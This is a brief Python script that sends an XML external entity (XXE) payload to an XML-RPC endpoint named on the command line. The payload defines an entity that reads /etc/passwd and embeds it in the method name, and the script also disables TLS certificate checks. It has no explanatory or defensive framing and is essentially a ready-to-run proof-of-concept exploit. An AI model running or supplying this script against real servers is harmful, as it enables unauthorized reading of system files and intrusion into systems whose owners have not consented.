import pycurl
import sys
import time

s = pycurl.Curl()
s.setopt(s.URL, sys.argv[1])
s.setopt(s.POSTFIELDS, """<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY asd SYSTEM "/etc/passwd">]>
<methodCall> <methodName>&asd;</methodName> <params> </params> </methodCall>"""
)
s.setopt(s.VERBOSE, True)
s.setopt(s.HTTPHEADER, ["Content-Type: text/xml"])
s.setopt(pycurl.SSL_VERIFYPEER, 0)
s.setopt(pycurl.SSL_VERIFYHOST, 0)
s.perform()
